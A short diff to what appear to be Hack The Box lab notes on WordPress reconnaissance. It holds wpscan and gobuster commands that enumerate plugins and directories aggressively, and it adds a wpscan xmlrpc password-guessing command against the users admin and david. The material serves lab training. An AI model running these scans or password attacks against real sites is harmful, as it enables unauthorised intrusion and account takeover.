@@ -202,10 +202,14 @@ MarcosV999@htb[/htb]$ wpscan --url http://blog.inlanefreight.com --enumerate --a
 gobuster dir -u http://blog.inlanefreight.local/wp-content/ -w /usr/share/wordlists/metasploit/wp-plugins.txt -k -t 50 -q
 ```
 
-```
-wpscan --url http://blog.inlanefreight.local -e vp --no-banner --detection-mode aggressive
+```sh
+wpscan --url http://$target -e vp --no-banner --detection-mode aggressive
 ```
 
-```
+```sh
 wpscan --url http://blog.inlanefreight.local -e ap --no-banner --plugins-detection aggressive --plugins-version-detection aggressive --max-threads 60
+```
+
+```sh
+wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com
 ```
